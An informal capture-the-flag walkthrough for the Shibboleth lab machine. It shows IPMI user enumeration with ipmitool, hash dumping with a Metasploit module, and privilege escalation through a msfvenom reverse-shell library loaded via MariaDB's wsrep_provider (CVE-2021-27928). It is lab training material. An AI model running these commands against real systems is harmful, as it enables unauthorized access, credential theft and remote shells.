i saw the site at first nothing was obvious then i did sub domain enum and got  3 domains

one was loging page but i didnt have creds

there was aline Bare Metal ==BMC== automation  on lloking for it on google it says ==IPMI==

there was  a tool

```
└─$ ipmitool -I lanplus -H 10.10.11.124 -U '' -P '' user
```

we got conformation of user Aministrator then we used msfconsole to get hash

`msf6 auxiliary(scanner/ipmi/ipmi_dumphashes`

we got hash

we logged in

now to upload shell we used ==base64==

just read it https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html

and for priv esc

we had ==mariadb== outdated version

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o CVE-2021-27928.so

mysql -u <user> -p -h <ip>
SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
```

we got shell on listening to the port
